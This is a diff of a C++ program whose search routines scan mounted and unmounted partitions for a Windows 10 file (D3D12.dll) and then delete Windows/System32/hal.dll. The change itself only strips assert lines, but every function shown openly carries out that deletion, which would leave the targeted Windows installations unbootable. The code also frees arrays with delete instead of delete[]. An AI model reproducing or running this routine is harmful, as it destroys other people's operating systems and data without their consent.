@@ -145,16 +145,14 @@ void MountedSearch() {
     strcpy(name, source);
     strcat(name, "/Windows/System32/D3D12.dll");
     printf("Looking for file: %s\n", name);
-    assert(strlen(name) == strlen(source) + 28);//////////////////
 
-    stat buffer; // struct???
+    stat buffer;
     if (stat(name, &buffer) == 0) {
       printf(RED "ERROR: Windows 10 detected in partition:" NORMAL " %s\n", drive);
       char* del = new char[strlen(source) + 26];
       strcpy(del, source);
       strcat(del, "/Windows/System32/hal.dll");
       printf("Deleting %s ...\n", del);
-      assert(strlen(del) == strlen(source) + 26);//////////////////
       remove(del);
       delete del;
     }
@@ -206,7 +204,6 @@ void UnmountedSearch() {
     strcpy(name, source);
     strcat(name, "/Windows/System32/D3D12.dll");
     printf("Looking for file: %s\n", name);
-    assert(strlen(name) == strlen(source) + 28);//////////////////
 
     stat buffer;
     if (stat(name, &buffer) == 0) {
@@ -215,7 +212,6 @@ void UnmountedSearch() {
       strcpy(del, source);
       strcat(del, "/Windows/System32/hal.dll");
       printf("Deleting %s ...\n", del);
-      assert(strlen(del) == strlen(source) + 26);//////////////////
       remove(del);
       delete del;
     }
